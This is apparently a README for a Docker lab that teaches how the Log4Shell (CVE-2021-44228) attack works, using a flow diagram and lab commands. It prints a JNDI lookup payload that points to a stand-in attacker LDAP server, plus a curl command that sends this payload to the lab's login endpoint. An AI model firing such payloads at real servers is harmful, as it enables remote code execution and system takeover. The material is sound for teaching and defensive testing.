# How the Log4Shell Attack Works

## Overview

Log4Shell (CVE-2021-44228) is a critical vulnerability in Log4j, a popular Java logging library. It allows attackers to execute malicious code on servers just by sending a specially crafted text string.

---

## Step-by-Step Attack Flow

### **Attacker Sends Malicious Input**

The attacker enters a special string in any field the application logs (username, search query, user-agent, etc.):

```
${jndi:ldap://attacker-server:1389/Exploit}
```

**What this means:**
- `${}` - "Hey Log4j, do something special with this"
- `jndi:` - "Use JNDI to look something up"
- `ldap://attacker-server:1389/Exploit` - "Connect to this address and ask for 'Exploit'"

### **Application Logs the Input**

The vulnerable application logs this input:

```java
logger.info("User logged in: " + username);
```

Normally, this just saves text to a log file. But Log4j sees the `${}` pattern and thinks: "This is a special command!"

### **Log4j Processes the Command**

Log4j sees `${jndi:ldap://...}` and automatically:
1. Makes a connection to the attacker's LDAP server
2. Asks: "What is 'Exploit'?"

**This is the vulnerability** - Log4j shouldn't automatically connect to external servers just because someone typed a special string!

### **Attacker's Server Responds**

The attacker's LDAP server responds:

```
"Go download this Java class from http://attacker-server:8888/Exploit.class"
```

### **Victim Downloads Malicious Code**

The victim's server:
1. Connects to `http://attacker-server:8888/Exploit.class`
2. Downloads the malicious Java class
3. Loads it into memory

### **Malicious Code Executes**

The `Exploit.class` file contains code that runs automatically when loaded:

```java
static {
    // This code runs immediately!
    Runtime.getRuntime().exec("malicious command");
}
```

**The attacker now has control!** They can:
- Create backdoors
- Steal data
- Install ransomware
- Pivot to other systems

---

## Visual Diagram

```
┌─────────────┐         ┌──────────────────┐         ┌─────────────────┐
│   Attacker  │         │ Vulnerable App   │         │ Attacker Server │
│             │         │  (with Log4j)    │         │  (LDAP + HTTP)  │
└─────┬───────┘         └────────┬─────────┘         └────────┬────────┘
      │                          │                             │
      │  1. Send malicious       │                             │
      │     payload              │                             │
      ├─────────────────────────>│                             │
      │  ${jndi:ldap://...}      │                             │
      │                          │                             │
      │                          │  2. Log4j processes         │
      │                          │     JNDI lookup             │
      │                          │                             │
      │                          │  3. Connect to LDAP         │
      │                          ├────────────────────────────>│
      │                          │     "Give me Exploit"       │
      │                          │                             │
      │                          │  4. "Download from HTTP"    │
      │                          │<────────────────────────────┤
      │                          │                             │
      │                          │  5. Download Exploit.class  │
      │                          ├────────────────────────────>│
      │                          │                             │
      │                          │  6. Return malicious code   │
      │                          │<────────────────────────────┤
      │                          │                             │
      │                          │  7. Execute malicious code  │
      │                          │        COMPROMISED!         │
      │                          │                             │
```

---

## Why Is This So Dangerous?

1. **No authentication required** - Just send a string
2. **Works on any input field** - Username, password, search, user-agent, etc.
3. **Automatic execution** - No user interaction needed
4. **Widespread usage** - Log4j is used in thousands of applications
5. **Remote Code Execution (RCE)** - Complete system takeover

---

## Testing the Attack in This Lab

### Start the Lab
```bash
docker-compose up --build
```

### Send the Exploit
```bash
curl -X POST http://localhost:8080/login \
  -d "username=\${jndi:ldap://ldap-server-exploit:1389/Exploit}&password=test"
```

### Verify the Attack Worked
```bash
docker exec web_ssrf-vulnerable-app-1 ls -la /tmp/pwned
```

If you see the file, **the attack succeeded!** The malicious code executed and created a file.

## Additional Resources

- [NIST CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
- [Apache Log4j Security Vulnerabilities](https://logging.apache.org/log4j/2.x/security.html)
- [CISA Log4Shell Guidance](https://www.cisa.gov/log4j-vulnerability-guidance)